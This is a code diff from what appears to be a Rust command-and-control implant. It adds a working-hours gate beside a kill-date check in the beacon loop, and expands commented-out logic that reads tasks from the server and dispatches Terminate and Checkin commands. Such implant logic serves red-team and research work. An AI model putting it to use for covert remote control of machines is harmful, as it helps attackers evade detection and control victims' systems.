@@ -9,7 +9,7 @@ use rs2_communication_protocol::metadata::Metadata;
 use rs2_communication_protocol::protocol::Protocol;
 
 use mod_agentcore::instance;
-use mod_win32::nt_time::{check_kill_date, wait_until};
+use mod_win32::nt_time::{check_kill_date, is_working_hours, wait_until};
 
 use crate::common::utils::{generate_path, generate_request_id};
 use crate::setup::communication::{encryptor_from_raw, protocol_from_raw};
@@ -34,12 +34,13 @@ where
             return;
         }
 
-        //KillDate
         if check_kill_date(instance().config.kill_date) {
             command_exit(1);
         }
 
-        // !Working Hours -> continue
+        if !is_working_hours(&instance().config.working_hours) {
+            return;
+        }
 
         #[cfg(feature = "std-runtime")]
         let (result_tx, result_rx) = mpsc::channel::<TaskOutput>();
@@ -71,10 +72,33 @@ where
             let result = rt.block_on(async { protocol.write(data, Some(encryptor.clone())).await });
 
             if result.is_ok() {
-                // let tasks_response: Result<, anyhow::Error> =
+                // // Read the list of commands from the protocol
+                // let tasks_response: Result<Vec<SimpleAgentCommand>, anyhow::Error> =
                 //     protocol.read(result.unwrap(), Some(encryptor.clone()));
-                // for each task in tasks {
-                //
+
+                // match tasks_response {
+                //     Ok(tasks) => {
+                //         // Iterate over each task in the list of commands
+                //         for command in tasks {
+                //             let result_tx = result_tx.clone();
+                //             let runtime_clone = Arc::clone(&rt);
+
+                //             // Spawn a new task to handle each command concurrently
+                //             runtime_clone.spawn(move || {
+                //                 let result = match command.op {
+                //                     AgentCommands::Terminate => command_exit(command.metadata),
+                //                     AgentCommands::Checkin => command_checkin(command.metadata),
+                //                 };
+
+                //                 // Send the result back through the result_tx channel
+                //                 result_tx.send(result).unwrap();
+                //             });
+                //         }
+                //     }
+                //     Err(e) => {
+                //         // Handle error when reading tasks from protocol
+                //         eprintln!("Failed to read tasks: {:?}", e);
+                //     }
                 // }
 
                 for i in 0..10 {
@@ -145,8 +169,6 @@ where
                     .await
                     .unwrap();
             });
-
-            // println!("Result {}: {:?}", i, result);
         }
     })
 }
@@ -174,8 +196,6 @@ where
                     .await
                     .unwrap();
             });
-
-            // println!("Result {}: {:?}", i, result);
         }
     })
 }
